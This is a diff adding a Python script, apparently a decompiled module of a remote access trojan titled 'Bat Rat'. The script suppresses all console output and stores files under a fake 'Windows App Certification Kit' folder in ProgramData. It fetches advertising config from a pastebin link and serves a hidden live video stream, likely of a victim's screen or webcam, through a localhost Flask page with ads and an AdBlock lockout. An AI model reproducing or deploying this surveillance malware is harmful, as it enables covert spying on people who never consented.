@@ -1,0 +1,42 @@
+import requests
+import json
+from flask import Flask, render_template_string, send_from_directory
+import argparse
+import sys
+import os
+sys.stdout = open(os.devnull, 'w')
+sys.stderr = open(os.devnull, 'w')
+parser = argparse.ArgumentParser()
+parser.add_argument('free_port', help='free_port')
+args = parser.parse_args()
+STATIC_DIR = 'C:\\ProgramData\\Windows App Certification Kit\\static'
+os.makedirs(STATIC_DIR, exist_ok=True)
+url = 'https://pastebin.com/raw/bUC8DmPD'
+response = requests.get(url)
+if response.status_code == 200:
+    data = json.loads(response.text)
+    Baner_link = data['Baner_link']
+    link_for_banner = data['link_for_banner']
+    tg_owner = data['tg_owner']
+else:  # inserted
+    Baner_link = 'none'
+    link_for_banner = 'none'
+    tg_owner = 'none'
+HTML = f"\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Live Stream</title>\n  <style>\n    body { background: #000; color: #fff; text-align: center; margin: 0; padding: 20px; font-family: Arial, sans-serif; }\n    .video-container { display: flex; justify-content: center; align-items: center; margin-top: 20px; }\n    video { border: 2px solid #444; border-radius: 8px; max-width: 100%; width: 640px; height: 480px; }\n    .ad-content { margin-top: 20px; font-size: 18px; color: #ccc; line-height: 1.6; }\n    .banner-container { display: flex; justify-content: center; align-items: center; margin-top: 20px; }\n    .banner { max-width: 100%; border-radius: 8px; }\n    .warning { color: #ffffff; font-size: 24px; margin-top: 50px; }\n    video::-webkit-media-controls-timeline,\n    video::-webkit-media-controls-current-time-display,\n    video::-webkit-media-controls-time-remaining-display,\n    video::-webkit-media-controls-playback-rate-button { display: none !important; }\n  </style>\n</head>\n<body>\n  <h1>🎥 Bat Rat</h1>\n\n  <div class=\"video-container\">\n    <video id=\"video\" controls autoplay muted playsinline></video>\n  </div>\n\n  <div class=\"ad-content\" id=\"adContent\">\n    {(f'<div class=\"banner-container\"><a href=\"{link_for_banner}\" target=\"_blank\"><img src=\"{Baner_link}\" alt=\"Banner\" class=\"banner\" /></a></div>' if Baner_link!= 'none' else f'<div id=\"adText\">Здесь могла быть ваша реклама<br>По рекламе обращайтесь к: <a href=\"{tg_owner}\" target=\"_blank\">{tg_owner}</a></div>')}\n  </div>\n\n  <script src=\"https://cdn.jsdelivr.net/npm/hls.js@latest\"></script>\n  <script>\n    const video = document.getElementById(\'video\');\n    const streamUrl = \'/stream.m3u8\';\n    let hls;\n\n    const hlsConfig = { liveSyncDuration: 3, maxMaxBufferLength: 5, liveDurationInfinity: true, enableWorker: true, maxBufferSize: 10 * 1000 * 1000, highBufferWatchdogPeriod: 2, initialLiveManifestSize: 3 };\n\n    function initPlayer() {\n      if (Hls.isSupported()) {\n        if (hls) hls.destroy();\n        hls = new Hls(hlsConfig);\n        hls.loadSource(streamUrl);\n        hls.attachMedia(video);\n        hls.on(Hls.Events.MANIFEST_PARSED, () => { video.play().catch(err => console.log(\'Autoplay error:\', err)); });\n        hls.on(Hls.Events.ERROR, (event, data) => { if (data.fatal) { switch (data.type) { case Hls.ErrorTypes.NETWORK_ERROR: hls.startLoad(); break; case Hls.ErrorTypes.MEDIA_ERROR: hls.recoverMediaError(); break; default: initPlayer(); break; } } });\n      } else if (video.canPlayType(\'application/vnd.apple.mpegurl\')) {\n        video.src = streamUrl;\n        video.addEventListener(\'loadedmetadata\', () => { video.currentTime = Infinity; video.play(); });\n      }\n    }\n\n    setInterval(() => { if (video.duration - video.currentTime > 5) { video.currentTime = video.duration; } }, 1000);\n    document.addEventListener(\'visibilitychange\', () => { if (document.visibilityState === \'visible\' && video.paused) { video.play().catch(() => {}); } });\n    window.addEventListener(\'online\', () => { if (!video.src && Hls.isSupported()) { initPlayer(); } });\n\n    setTimeout(() => {\n      const adBanner = document.querySelector(\'.banner-container\');\n      const adText = document.getElementById(\'adText\');\n      let isBlocked = false;\n      if (adBanner && adBanner.offsetHeight === 0) isBlocked = true;\n      if (adText && adText.offsetHeight === 0) isBlocked = true;\n      if (isBlocked) { document.body.innerHTML = \'<div class=\"warning\">Отключите AdBlock, чтобы продолжить пользоваться сайтом</div>\'; }\n    }, 1000);\n\n    initPlayer();\n  </script>\n</body>\n</html>\n"
+app = Flask(__name__, static_folder=STATIC_DIR, static_url_path='')
+
+@app.route('/')
+def index():
+    return render_template_string(HTML)
+
+@app.route('/stream.m3u8')
+def playlist():
+    return send_from_directory(STATIC_DIR, 'stream.m3u8')
+
+@app.route('/<path:filename>')
+def segments(filename):
+    return send_from_directory(STATIC_DIR, filename)
+
+def flask_worker():
+    app.run(host='127.0.0.1', port=args.free_port, debug=False, use_reloader=False)
+flask_worker()
